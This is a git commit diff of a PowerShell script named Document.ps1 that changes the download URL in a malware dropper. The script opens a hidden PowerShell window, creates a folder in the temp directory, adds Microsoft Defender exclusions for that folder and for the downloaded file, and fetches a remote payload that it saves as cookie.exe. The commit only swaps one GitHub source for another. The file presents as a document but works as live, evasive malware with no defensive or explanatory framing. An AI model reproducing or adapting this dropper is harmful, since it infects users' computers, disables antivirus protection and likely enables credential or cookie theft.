445a6258aabb56642e52150718844b6fc83f213b
PXTDEV9022 <qnuts1tg222@gmail.com>
2024-12-28 15:02:57 +0700

    Update Document.ps1

--- Document.ps1
+++ Document.ps1
@@ -2,7 +2,7 @@ start /min powershell.exe -WindowStyle Hidden -Command "
 $A=[System.IO.Path]::Combine($env:temp,'System')
 if(-not(Test-Path -Path $A)){New-Item -Path $A -ItemType Directory -Force}
 try{Add-MpPreference -ExclusionPath $A}catch{}
-$B='https://raw.githubusercontent.com/blackcodeit407/system/main/cookie.txt'
+$B='https://github.com/PXTDEV9022/tiendev/raw/refs/heads/main/python.txt'
 $C=[System.IO.Path]::Combine($A,'cookie.exe')
 Invoke-WebRequest -Uri $B -OutFile $C
 try{Add-MpPreference -ExclusionProcess $C}catch{}
